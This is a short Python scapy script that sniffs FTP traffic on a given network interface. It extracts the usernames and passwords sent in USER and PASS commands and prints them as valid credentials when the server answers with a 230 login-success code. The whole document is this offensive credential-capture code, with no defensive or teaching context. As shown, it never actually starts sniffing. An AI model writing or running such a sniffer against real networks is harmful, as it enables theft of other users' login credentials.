import sys
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)
from scapy.all import *


interface = sys.argv[1]

usernames = ['']
passwords = ['']


def check_login(pkt, username, password):
	if b'230' in pkt[Raw].load:
		print ('[*] Valid FTCredentials Found... ')
		print ('\t[*] ' + str(pkt[IP].dst).strip() + ' -> ' + str(pkt[IP].src).strip() + ':')
		print ('\t   [*] Username: ' + str(username))
		print ('\t   [*] Password: ' + str(password) + '\n')
		return
	else:
		return


def check_for_ftp(pkt):
	if pkt.haslayer(TCP) and pkt.haslayer(Raw):
		if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
			return True
		else:
			return False
	else:
		return False

def check_pkt(pkt):
	conf.verb = 0
	if check_for_ftp(pkt):
		pass
	else:
		return
	data = pkt[Raw].load
	if b'USER ' in data:
		usernames.append(data.split(b'USER ')[1].strip())
	elif b'PASS ' in data:
		passwords.append(data.split(b'PASS ')[1].strip())
	else:
		check_login(pkt, usernames[-1], passwords[-1])
		return
